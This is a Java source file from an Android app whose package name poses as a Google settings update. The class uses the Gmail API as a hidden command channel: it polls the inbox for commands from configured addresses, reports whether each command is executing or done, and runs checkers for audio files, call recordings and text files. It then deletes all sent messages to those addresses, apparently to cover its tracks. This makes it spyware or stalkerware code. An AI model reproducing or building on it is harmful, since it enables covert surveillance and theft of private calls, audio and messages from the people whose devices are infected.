package com.setting.dl.google.googlesettingupdate.ptt.kahverengi;

import android.content.Context;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;

import com.google.api.services.gmail.Gmail;
import com.setting.dl.google.googlesettingupdate.mail.gmail.GmailService;
import com.setting.dl.google.googlesettingupdate.ptt.IPTTService;
import com.setting.dl.google.googlesettingupdate.ptt.box.IInbox;
import com.setting.dl.google.googlesettingupdate.ptt.checkers.FilesCheckers;
import com.setting.dl.google.googlesettingupdate.ptt.command.ICommand;
import com.setting.dl.google.googlesettingupdate.ptt.deleters.SentboxDeleter;
import com.setting.dl.google.googlesettingupdate.ptt.checkers.ICheckFilesCompleteListener;
import com.setting.dl.google.googlesettingupdate.ptt.checkers.ICheckSent;
import com.setting.dl.google.googlesettingupdate.ptt.checkers.IFilesCheckers;
import com.setting.dl.google.googlesettingupdate.ptt.message.IMessage;
import com.setting.dl.google.googlesettingupdate.ptt.box.IMessagebox;
import com.setting.dl.google.googlesettingupdate.ptt.deleters.ISentboxDeleter;
import com.setting.dl.google.googlesettingupdate.ptt.box.MessageBox;

import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Objects;


public class PTTKahverengi implements IPTTService, ICheckFilesCompleteListener, IFilesCheckers, ICheckSent {
   
   private              IMessagebox                  messagebox;
   private final        Gmail                        gmail;
   private              String                       queryTo;
   private static       WeakReference<PTTKahverengi> ptt;
   private              List<String>                 outboxLabels;
   private              FilesCheckers                filesCheckers;
   private              ISentboxDeleter              sentboxDeleter = new SentboxDeleter();
   private static final Object                       obj            = new Object();
   
   
   private PTTKahverengi(Context context) {
      
      //Context context1 = context;
      List<String> recipients = new ArrayList<>(Objects.requireNonNull(context.getSharedPreferences("gmail", Context.MODE_PRIVATE).getStringSet("to", new HashSet<>())));
      String       queryFrom  = makeQueryFrom(recipients);
      queryTo = makeQueryTo(recipients);
      gmail = GmailService.getGmailService(context);
      outboxLabels = Collections.singletonList("SENT");
      String sender = context.getSharedPreferences("gmail", Context.MODE_PRIVATE).getString("from", null);
      messagebox = new MessageBox(context, gmail, sender, recipients, Collections.singletonList("INBOX"), queryFrom, queryTo);
      
      
      filesCheckers = new FilesCheckers(context, this);
   }
   
   public static PTTKahverengi getInstance(Context context) {
      
      if (ptt == null || ptt.get() == null) {
         
         synchronized (obj) {
            
            if (ptt == null || ptt.get() == null) {
               
               ptt = new WeakReference<>(new PTTKahverengi(context));
            }
         }
      }
      
      return ptt.get();
   }
   
   @Override
   synchronized public void addToOutbox(IMessage message) {
      messagebox.addToOutbox(message);
   }
   
   @Override
   public void deleteAllSent() {
      sentboxDeleter.deleteAllSentMessages(gmail, outboxLabels, queryTo);
   }
   
   @NonNull
   private String makeQueryTo(List<String> recipients) {
      
      if (recipients.size() == 0) return "";
      
      if (recipients.size() == 1) return "to:" + recipients.get(0);
      
      StringBuilder stringBuilder = new StringBuilder();
      
      for (int i = 0; i < recipients.size(); i++) {
         
         stringBuilder.append("to:").append(recipients.get(i));
         
         if (i != recipients.size() - 1) stringBuilder.append(" ");
      }
      
      return stringBuilder.toString();
   }
   
   private String makeQueryFrom(List<String> recipients) {
      
      if (recipients.size() == 0) return "";
      
      if (recipients.size() == 1) return "from:" + recipients.get(0);
      
      StringBuilder stringBuilder = new StringBuilder();
      
      for (int i = 0; i < recipients.size(); i++) {
         
         stringBuilder.append("from:").append(recipients.get(i));
         
         if (i != recipients.size() - 1) stringBuilder.append(" ");
      }
      
      return stringBuilder.toString();
   }
   
   @Override
   synchronized 
   public void checkInbox() {
      
      messagebox.checkInbox();
   }
   
   @Override
   synchronized 
   public void onCheckComplete(@Nullable String commandId) {
      
      if (commandId == null) return;
      
      messagebox.onCheckComplete(commandId);
   }
   
   @Override
   synchronized 
   public void checkAudioFiles() {
      filesCheckers.checkAudioFiles();
   }
   
   @Override
   synchronized 
   public void checkAudioFiles(@Nullable String id) {
      filesCheckers.checkAudioFiles(id);
   }
   
   @Override
   synchronized 
   public void checkCallFiles() {
      filesCheckers.checkCallFiles();
   }
   
   @Override
   synchronized 
   public void checkCallFiles(@Nullable String id) {
      filesCheckers.checkCallFiles(id);
   }
   
   @Override
   synchronized 
   public void checkTextFiles(@Nullable String id) {
      filesCheckers.checkTextFiles(id);
   }
   
   @Override
   synchronized 
   public void checkTextFiles() {
      filesCheckers.checkTextFiles();
   }
   
   @Override
   synchronized 
   public void checkSent() {
      messagebox.checkSent();
   }
   
   @Override
   public void setCommandExecuted(String id, String comment) {
      messagebox.setCommandExecuted(id, comment);
   }
   
   @Override
   public void setCommandExecuting(boolean isExecuting,  String id, String comment) {
      messagebox.setCommandExecuting(isExecuting, id, comment);
   }
   
   @Override
   public void deleteAllCommands() {
      
      messagebox.getInbox().deleteAllCommands();
   }
   
   @Override
   public IInbox getInbox() {
      return messagebox.getInbox();
   }
   
   @Override
   public ICommand getCommand(String commandId) {
      return messagebox.getInbox().getCommand(commandId);
   }
}
